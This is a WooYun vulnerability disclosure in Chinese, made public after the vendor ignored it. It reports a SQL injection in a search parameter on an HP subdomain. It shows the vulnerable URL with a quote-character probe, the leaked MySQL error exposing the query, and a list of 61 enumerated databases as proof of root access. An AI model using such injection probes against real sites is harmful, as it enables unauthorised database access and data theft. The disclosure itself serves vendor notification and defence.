wybug_title: 惠普某分站存在SQL注入漏洞(root权限)
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2014-12-27：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-02-10：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 惠普某分站存在SQL注入漏洞(MYSQL root权限），一大堆数据库 详细说明：  http://success.hp.com/lexika/list.php?act=articlesearch&search[metainfo_id]=318432%27
Query: SELECT DISTINCT la.id, la.lexikon_id, la.art_id, la.title, la.preiskategorie_id, la.frei, la.speaking_url FROM lexikon_article la, lexikon_article_metainfo lam, lexikon l WHERE l.title like '%lexikon%' AND lam.metainfo_id = 318432\' AND l.recherche = 1 AND lam.article_id = la.id AND l.id = la.lexikon_id ORDER BY la.title_sort, la.title Fehler 1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' AND l.recherche = 1 AND lam.article_id = la.id AND l.id = la.lexikon_id ORD' at line 4 (db=0, current_db=)
   漏洞证明：  
available databases [61]:[*] biospektrum[*] bnt[*] campbell[*] chrono[*] contoo2[*] doi[*] epoq[*] facebook[*] fischer_wa[*] forum_contoo[*] games[*] holtzbrinck[*] information_schema[*] intern[*] international[*] kno_neues[*] kosmo[*] lifetype[*] mantis[*] meetings[*] meetings_dgfi[*] meetings_extern[*] meetings_test[*] mh_lt[*] mhtest[*] mysql[*] nature[*] naturejobs[*] new.mysql[*] new_mysql[*] nl_sdwv[*] nl_spotlight[*] phpOpenTracker[*] phprojekt[*] purves[*] sav[*] sav2[*] scilogs_com[*] scilogs_com_dev[*] scilogs_de[*] scilogs_de_dev[*] scilogs_de_dev_2[*] scilogs_de_xxx[*] scilogs_dev_fr[*] scilogs_eu[*] scilogs_fr[*] scilogs_org[*] sixcms72_wo[*] sixcms72_wo_utf8[*] spektrum[*] spektrum6_mysql[*] suche_log[*] tech[*] test[*] test_u_f_journals[*] umfragen[*] vgwort[*] wissenblog[*] wissenschaft_extras[*] wissenschaft_online[*] zenit_mapping
   修复方案：  过滤   版权声明：转载请注明来源 猪猪侠@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
